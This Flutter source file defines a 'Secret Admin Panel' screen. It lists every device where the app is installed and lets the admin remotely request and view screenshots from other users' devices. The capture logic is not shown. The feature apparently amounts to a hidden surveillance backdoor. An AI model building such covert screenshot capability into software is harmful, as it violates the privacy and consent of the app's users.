import 'package:flutter/material.dart';
import 'package:get/get.dart';
import '../controllers/admin_controller.dart';
import '../controllers/theme_controller.dart';

class AdminPanelScreen extends StatelessWidget {
  const AdminPanelScreen({super.key});

  @override
  Widget build(BuildContext context) {
    final adminCtrl = Get.find<AdminController>();
    final themeCtrl = Get.find<ThemeController>();

    return GetBuilder<ThemeController>(
      builder: (themeState) {
        final theme = themeState.currentTheme;

        return Scaffold(
          appBar: AppBar(
            title: const Text('Secret Admin Panel'),
            backgroundColor: theme.blue,
            actions: [
              IconButton(
                icon: const Icon(Icons.refresh),
                onPressed: adminCtrl.refreshDeviceList,
                tooltip: 'Refresh Device List',
              ),
            ],
          ),
          body: Obx(() {
            if (!adminCtrl.isReady.value) {
              return const Center(child: CircularProgressIndicator());
            }

            return ListView(
              padding: const EdgeInsets.all(16.0),
              children: [
                Card(
                  color: theme.cardBg,
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                  child: Padding(
                    padding: const EdgeInsets.all(16.0),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'Installed Devices',
                          style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold, color: theme.textPrimary),
                        ),
                        const SizedBox(height: 8),
                        Text(
                          'Total devices excluding this admin device: ${adminCtrl.otherInstalledDevicesCount}',
                          style: TextStyle(fontSize: 14, color: theme.textSecondary),
                        ),
                        const SizedBox(height: 4),
                        Text(
                          'Your device ID: ${adminCtrl.currentDeviceId.value}',
                          style: TextStyle(fontSize: 12, color: theme.textSecondary),
                        ),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 16),
                ...adminCtrl.devices.map((device) {
                  final isSelf = device.deviceId == adminCtrl.currentDeviceId.value;
                  return Card(
                    color: theme.cardBg,
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                    margin: const EdgeInsets.only(bottom: 12),
                    child: Padding(
                      padding: const EdgeInsets.all(14.0),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.stretch,
                        children: [
                          Row(
                            children: [
                              Expanded(
                                child: Text(
                                  isSelf ? 'This device (admin)' : 'Device: ${device.deviceId}',
                                  style: TextStyle(fontWeight: FontWeight.bold, color: theme.textPrimary),
                                ),
                              ),
                              Chip(
                                label: Text(device.platform.toUpperCase()),
                                backgroundColor: theme.boardBg,
                                labelStyle: TextStyle(color: theme.textPrimary),
                              ),
                            ],
                          ),
                          const SizedBox(height: 8),
                          Text(
                            'Last active: ${device.lastSeenAt?.toLocal().toString() ?? 'unknown'}',
                            style: TextStyle(color: theme.textSecondary, fontSize: 12),
                          ),
                          const SizedBox(height: 12),
                          ElevatedButton.icon(
                            onPressed: isSelf
                                ? null
                                : () async {
                                    await adminCtrl.requestScreenshot(device.deviceId);
                                    Get.snackbar(
                                      'Screenshot Requested',
                                      'A screenshot request was sent to the selected device.',
                                      snackPosition: SnackPosition.BOTTOM,
                                    );
                                  },
                            icon: const Icon(Icons.photo_camera),
                            label: const Text('Request Screenshot'),
                            style: ElevatedButton.styleFrom(
                              backgroundColor: isSelf ? Colors.grey : theme.blue,
                            ),
                          ),
                        ],
                      ),
                    ),
                  );
                }).toList(),
                if (adminCtrl.screenshotRequests.isNotEmpty) ...[
                  const SizedBox(height: 12),
                  Text('Recent Screenshot Requests', style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold, color: theme.textPrimary)),
                  const SizedBox(height: 8),
                  ...adminCtrl.screenshotRequests.map((request) {
                    return Card(
                      color: theme.cardBg,
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                      margin: const EdgeInsets.only(bottom: 10),
                      child: Padding(
                        padding: const EdgeInsets.all(12.0),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.stretch,
                          children: [
                            Text('Request ID: ${request.requestId}', style: TextStyle(color: theme.textPrimary, fontWeight: FontWeight.w700)),
                            const SizedBox(height: 6),
                            Text('Target: ${request.targetDeviceId}', style: TextStyle(color: theme.textSecondary)),
                            const SizedBox(height: 4),
                            Text('Status: ${request.status}', style: TextStyle(color: theme.textSecondary)),
                            if (request.screenshotUrl != null) ...[
                              const SizedBox(height: 10),
                              Image.network(request.screenshotUrl!, fit: BoxFit.cover),
                            ],
                            if (request.error != null) ...[
                              const SizedBox(height: 8),
                              Text('Error: ${request.error}', style: TextStyle(color: Colors.redAccent, fontSize: 12)),
                            ],
                          ],
                        ),
                      ),
                    );
                  }),
                ],
              ],
            );
          }),
        );
      },
    );
  }
}
